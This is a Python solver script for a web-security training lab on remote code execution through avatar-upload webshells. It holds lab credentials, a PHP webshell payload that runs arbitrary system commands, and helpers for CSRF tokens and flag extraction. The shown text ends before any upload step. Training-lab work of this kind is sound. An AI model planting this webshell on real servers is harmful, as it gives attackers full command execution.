import requests
import argparse
from lxml import html
import pyperclip

USERNAME = "wiener"
PASSWORD = "peter"
WEBSHELL = "<?php echo system($_GET['command']); ?>"

LOGIN_CSRF_XPATH = '//input[@name="csrf"]/@value'
MY_ACCOUNT_AVATAR_UPLOAD_CSRF = (
    '//form[@id="avatar-upload-form"]/input[@name="csrf"]/@value'
)

# Creating a Session Object
# https://docs.python-requests.org/en/latest/api/#request-sessions
SESSION = requests.Session()


def generate_parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(prog="Remote Code Execution Via Webshell Upload")
    parser.add_argument(
        "-u", "--lab-url", help="Your lab instance URL is required", required=True
    )

    return parser.parse_args()


def get_csrf_token(body: str, xpath: str) -> str:
    tree = html.fromstring(body)
    return tree.xpath(xpath)[0]


def get_flag(content: str):
    flag = content

    # When I was trying this lab, the response contains the flag duplicated like this: <flag><flag>
    # To get the correct flag, simply split the string in half and compare the two halves.
    # If they are equal, keep only one half of the flag
    half = len(content) // 2
    if flag[:half] == flag[half:]:
        flag = flag[:half]

    print(f"[+] Flag: {flag}")

    # Copying flag to clipboard
    pyperclip.copy(flag)
    print("[+] Flag copied to clipboard")
